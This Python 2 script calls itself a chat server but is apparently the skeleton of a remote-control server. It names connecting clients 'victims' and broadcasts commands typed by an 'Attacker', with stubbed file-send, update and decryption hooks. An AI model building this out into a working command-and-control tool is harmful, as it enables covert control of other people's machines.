"""
chat - server side - deliver the messages to clients
"""

import socket
import select
import sys
import msvcrt

SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024
SOCKET_LISTEN = 5
KEY_ENTER = 13
KEY_BACKSPACE = 8

open_client_sockets = []
messages_to_send = []
action_message = []

def send_file():
    pass

def update_version(socket, file_path):
    pass


command_dict = {
    4: send_file()
}


# def action_to_preform(message):
#     action_code = int(message)
#     return action_dict[action_code]()
#
#
# def manipulate_data(encrypt_message):
#     decrypt_message = decryption(encrypt_message)
#     return action_to_preform(decrypt_message)


def decryption(message):
    return message


def handle_attacker_command(victim_list):
    if msvcrt.kbhit():  # if the client typed character
        char = msvcrt.getch()  # get this character
        if chr(KEY_ENTER) is char:  # if enter
            my_string_msg = ''.join(action_message)
            print '[Attacker]', my_string_msg

            for wsocket in victim_list:
                wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))

            del action_message[:]  # clean array

        elif ord(char) == KEY_BACKSPACE:  # backspace
            action_message.pop()

        else:
            # else just append the character to the message
            action_message.append(char)


def main():
    try:
        server_socket = socket.socket()
        server_socket.bind((SERVER_IP, SERVER_PORT))
        server_socket.listen(SOCKET_LISTEN)
        print 'server({}) is up. listening in port {}'.format(SERVER_IP, SERVER_PORT)

        while True:
            rlist, wlist, xlist = select.select([server_socket] + open_client_sockets, open_client_sockets, [])
            for current_socket in rlist:
                if current_socket is server_socket:
                    (new_socket, address) = server_socket.accept()
                    print 'New victim {0} !'.format(address)
                    open_client_sockets.append(new_socket)
                else:
                    try:
                        print '.....New data from client.....'
                        data = current_socket.recv(SOCKET_RECV_BYTES)
                        print (current_socket, data)

                        # response = manipulate_data(data)
                        # current_socket.send(response)


                    except Exception as e:
                        if current_socket in open_client_sockets:
                            open_client_sockets.remove(current_socket)
                        print 'Exception occurred in receive, value:', e.message

            handle_attacker_command(wlist)

    except Exception as e:
        print 'Exception occurred, value:', e.message
    finally:
        server_socket.close()
        print 'server connection is closed'


if __name__ == "__main__":
    main()
